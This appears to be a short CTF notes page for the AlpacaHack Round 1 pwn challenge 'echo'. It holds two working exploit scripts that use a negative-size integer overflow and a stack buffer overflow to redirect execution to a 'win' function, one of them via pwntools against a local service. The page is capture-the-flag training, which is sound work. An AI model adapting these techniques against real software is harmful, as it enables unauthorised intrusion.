# AlpacaHack
- [AlpacaHack](https://alpacahack.com/)
- [AlpacaHack Round 1 (Pwn)のWriteup - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2024/08/19/035647)

# AlpacaHack Round 1 (Pwn) / echo
[echo](https://alpacahack.com/ctfs/round-1/challenges/echo)

**exploit1.py**
```python
#!/usr/bin/env python3
import sys
import struct
def p64(x):
    return struct.pack("<Q", x)
# objdump -t echo | grep -w win | cut -d ' ' -f 1
win = p64(0x00000000004011f6)
sys.stdout.buffer.write(b"-2147483648"+b"\x0a")
sys.stdout.buffer.write(b"A"*(0x100+24))
sys.stdout.buffer.write(win+b"\x0a")
```

**exploit2.py**
```python
#!/usr/bin/env python3
from pwn import *
binary = "./echo"
context(arch = 'amd64', os = 'linux')
elf = ELF(binary)
win = elf.symbols["win"]
print("[#] addr of win:", hex(win))
#io = process(binary)
io = remote("127.0.0.1", 5000)
io.recvuntil(b"Size: ")
io.sendline(b"-2147483648")
io.recvuntil(b"Data: ")
io.sendline(b"A"*(0x100+24) + p64(win))
io.interactive()
```
